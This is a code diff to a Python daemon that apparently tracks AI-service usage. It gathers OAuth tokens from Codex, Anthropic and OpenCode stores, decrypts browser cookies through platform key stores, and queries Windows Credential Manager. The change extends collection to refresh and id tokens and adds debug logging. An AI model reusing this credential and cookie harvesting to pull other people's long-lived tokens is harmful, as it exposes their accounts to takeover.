@@ -14,6 +14,7 @@ All API calls are done by the server using tokens we provide.
 
 import argparse
 import atexit
+import ctypes
 import datetime
 import hashlib
 import hmac
@@ -229,7 +230,12 @@ __REGISTRY__: dict[str, Any] = {
                     "type": "file",
                     "paths": ["~/.codex/auth.json", "{{CONFIG_DIR:codex}}/auth.json"],
                     "format": "json",
-                    "mapping": {"tokens.access_token": "oauth_token"},
+                    "mapping": {
+                        "tokens.access_token": "oauth_token",
+                        "tokens.refresh_token": "refresh_token",
+                        "tokens.id_token": "id_token",
+                        "tokens.account_id": "account_id",
+                    },
                 },
                 {
                     "type": "env",
@@ -568,8 +574,6 @@ def setup_logging(log_level: str, file_enabled: bool) -> None:
 def _pid_is_alive(pid: int) -> bool:
     """Return True if a process with `pid` is currently running."""
     if sys.platform == "win32":
-        import ctypes
-
         kernel32 = ctypes.windll.kernel32
         handle = kernel32.OpenProcess(1, False, pid)
         if handle:
@@ -954,16 +958,12 @@ def resolve_path(path_str: str) -> Path:
         path_str = os.path.expanduser(path_str)
 
     if "{{CONFIG_DIR:" in path_str:
-        import re
-
         match = re.search(r"{{CONFIG_DIR:([^}]+)}}", path_str)
         if match:
             app_name = match.group(1)
             path_str = path_str.replace(match.group(0), str(get_platform_config_dir(app_name)))
 
     if "{{DATA_DIR:" in path_str:
-        import re
-
         match = re.search(r"{{DATA_DIR:([^}]+)}}", path_str)
         if match:
             app_name = match.group(1)
@@ -1014,25 +1014,23 @@ def decrypt_chromium_cookie(encrypted_value, browser_name="Chrome"):
                 if 1 <= pad_len <= 16:
                     return decrypted[:-pad_len].decode("utf-8")
         except Exception:
-            pass
+            logging.debug("macOS cookie decryption failed", exc_info=True)
         return None
 
     # Windows decryption
     if system == "Windows":
         try:
-            import ctypes
-            from ctypes import wintypes
 
             class DATA_BLOB(ctypes.Structure):
                 _fields_ = [
-                    ("cbData", wintypes.DWORD),
-                    ("pbData", ctypes.POINTER(wintypes.BYTE)),
+                    ("cbData", ctypes.wintypes.DWORD),
+                    ("pbData", ctypes.POINTER(ctypes.wintypes.BYTE)),
                 ]
 
             crypt32 = ctypes.windll.crypt32
             blob_in = DATA_BLOB()
             blob_in.cbData = len(encrypted_value)
-            blob_in.pbData = ctypes.cast(encrypted_value, ctypes.POINTER(wintypes.BYTE))
+            blob_in.pbData = ctypes.cast(encrypted_value, ctypes.POINTER(ctypes.wintypes.BYTE))
             blob_out = DATA_BLOB()
             if crypt32.CryptUnprotectData(
                 ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
@@ -1041,7 +1039,7 @@ def decrypt_chromium_cookie(encrypted_value, browser_name="Chrome"):
                 ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                 return buffer.decode("utf-8")
         except Exception:
-            pass
+            logging.debug("Windows cookie decryption failed", exc_info=True)
         return None
 
     # Linux decryption
@@ -1049,7 +1047,7 @@ def decrypt_chromium_cookie(encrypted_value, browser_name="Chrome"):
         try:
             return encrypted_value.decode("utf-8")
         except Exception:
-            pass
+            logging.debug("Direct UTF-8 decode of Linux cookie failed, trying secretstorage")
         import hashlib
 
         # Try secretstorage for Chrome/Edge keys
@@ -1079,7 +1077,7 @@ def decrypt_chromium_cookie(encrypted_value, browser_name="Chrome"):
             if 1 <= pad_len <= 16:
                 return decrypted[:-pad_len].decode("utf-8")
     except Exception:
-        pass
+        logging.debug("Linux cookie decryption failed", exc_info=True)
     return None
 
 
@@ -1253,6 +1251,7 @@ class BrowserCookieExtractor:
                         )
                 return all_cookies
         except Exception:
+            logging.debug("Failed to parse Safari cookies", exc_info=True)
             return []
 
     @staticmethod
@@ -1304,6 +1303,7 @@ class BrowserCookieExtractor:
                             if row:
                                 return row[0]
             except Exception:
+                logging.debug("Cookie extraction failed for browser target", exc_info=True)
                 continue
         return None
 
@@ -1334,7 +1334,7 @@ def get_windows_credential(target: str) -> str | None:
                 )
                 return password
     except Exception:
-        pass
+        logging.debug("Windows Credential Manager lookup failed for %r", target, exc_info=True)
     return None
 
 
@@ -1357,7 +1357,7 @@ def discover_anthropic_email() -> str:
                 if email:
                     return email
             except Exception:
-                pass
+                logging.debug("Failed to read Anthropic email from %s", creds_path, exc_info=True)
     return ""
 
 
@@ -1444,7 +1444,7 @@ def _opencode_account_email(db_path: Path | None) -> str:
             finally:
                 conn.close()
         except Exception:
-            pass
+            logging.debug("Failed to read account email from OpenCode DB", exc_info=True)
 
     return "default"
 
@@ -1564,7 +1564,7 @@ class GenericCollector:
                             if target:
                                 tokens[target] = raw
                 except Exception:
-                    pass
+                    logging.debug("File credential extraction failed", exc_info=True)
 
             # 4. Windows Credential Manager
             elif rule_type == "windows_credential" and platform.system() == "Windows":
@@ -1601,7 +1601,7 @@ class GenericCollector:
                                 if target:
                                     tokens[target] = val
                 except Exception:
-                    pass
+                    logging.debug("exec credential rule failed", exc_info=True)
 
             # 7. Specialized: SQLite (OpenCode)
             elif rule_type == "sqlite":
@@ -1623,7 +1623,9 @@ class GenericCollector:
                                         if row and row[0]:
                                             acc_label = row[0]
                                     except Exception:
-                                        pass
+                                        logging.debug(
+                                            "OpenCode account email query failed", exc_info=True
+                                        )
 
                                 for q in rule.get("queries", []):
                                     query_str = q.get("query")
@@ -1725,7 +1727,7 @@ class GenericCollector:
                                     }
                                 )
                         except Exception:
-                            pass
+                            logging.debug("SQLite credential/event rule failed", exc_info=True)
 
             # 8. Specialized: Claude Statusline
             elif rule_type == "file_json_statusline":
@@ -1795,7 +1797,7 @@ class GenericCollector:
                                     }
                                 )
                         except Exception:
-                            pass
+                            logging.debug("Statusline file rule failed", exc_info=True)
 
         # If tokens were extracted, add a hidden token card
         if tokens:
@@ -1855,9 +1857,9 @@ def _ag_detect_process_windows() -> dict[int, list[str]]:
                 "-NoProfile",
                 "-Command",
                 "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; "
-                "Get-WmiObject Win32_Process | "
-                "Where-Object {$_.CommandLine -like '*language_server*'} | "
-                'ForEach-Object { "$($_.ProcessId)|$($_.CommandLine)" }',
+                + "Get-WmiObject Win32_Process | "
+                + "Where-Object {$_.CommandLine -like '*language_server*'} | "
+                + 'ForEach-Object { "$($_.ProcessId)|$($_.CommandLine)" }',
             ],
             capture_output=True,
             text=True,
@@ -2572,7 +2574,9 @@ class DaemonRunner:
                                     )
                                     wm.advance(ev["provider_id"], ev["account_id"], ts)
                                 except Exception:
-                                    pass
+                                    logging.debug(
+                                        "Failed to advance event watermark", exc_info=True
+                                    )
                     except Exception as e:
                         logging.warning(f"Failed to advance event watermark: {e}")
 
